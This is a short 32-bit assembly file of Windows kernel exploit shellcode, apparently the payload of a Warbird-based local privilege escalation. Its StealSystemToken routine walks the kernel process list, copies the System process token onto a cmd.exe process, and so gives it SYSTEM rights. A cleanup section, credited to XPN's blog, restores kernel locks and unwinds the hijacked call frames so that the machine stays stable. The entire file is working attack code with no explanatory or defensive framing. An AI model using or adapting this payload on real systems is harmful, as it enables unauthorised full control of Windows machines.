BITS 32

StealSystemToken:
    pushad                          ; Save registers

    mov     edi, dword [fs:0x124]   ; edi = Current ETHREAD
    mov     edi, dword [edi+0x150]  ; edi = Current EPROCESS
    mov     ecx, dword [edi+0xb8]   ; ecx = ActiveProcessLinks

Loop1:
    mov     ecx, dword [ecx]        ; ecx = ActiveProcessLinks.Flink
    mov     eax, dword [ecx-0x4]    ; eax = UniqueProcessId
    cmp     eax, 0x4                ; UniqueProcessId == System
    jne     Loop1                   ; Loop

    mov     esi, dword [ecx+0x44]   ; esi = SystemToken | _EX_FAST_REF
    and     esi, 0xfffffff0         ; esi = SystemToken

Loop2:
    mov     ecx, dword [ecx]        ; ecx = ActiveProcessLinks.Flink
    mov     eax, dword [ecx+0xc4]   ; eax = ImageFileName
    cmp     eax, 'cmd.'             ; ImageFileName == 'cmd.'
    jne     Loop2                   ; Loop

    mov     dword [ecx+0x44], esi   ; ProcessToken = SystemToken

    popad                           ; Restore registers

;;
; The method for cleaning up was found by Adam Chester (XPN)
; The original code is at https://blog.xpnsec.com/windows-warbird-privesc/
Cleanup:
    mov     dword [ebx + 4], 0      ; WARBIRD_EXTENSION.count = 0

    mov     edi, dword [fs:0x124]   ; edi = Current ETHREAD
    mov     dword [edi + 0x13e], 0  ; SpecialAPCDisable = 0

    mov     ecx, 0xc                ; ecx = sizeof(_KLOCK_ENTRY) / 4
    xor     eax, eax
    add     edi, 0x1e8              ; edi = LockEntries[0]
    rep     stosd                   ; LockEntries[0] = 0

WalkUpStackFrames:
    add     esp, 0x10               ; Clear the cmp_func stack frame
    leave                           ; WbFindLookupEntry epilog
    leave                           ; WbFindWarbirdProcess epilog
    leave                           ; WbGetWarbirdProcess epilog
    add     esp, 0x8                ; Clear eip and 1 argument

WbDispatchOperationEpilog:
    pop     edi
    pop     edi
    pop     esi
    pop     ebx
    mov     esp, ebp
    pop     ebp
    ret
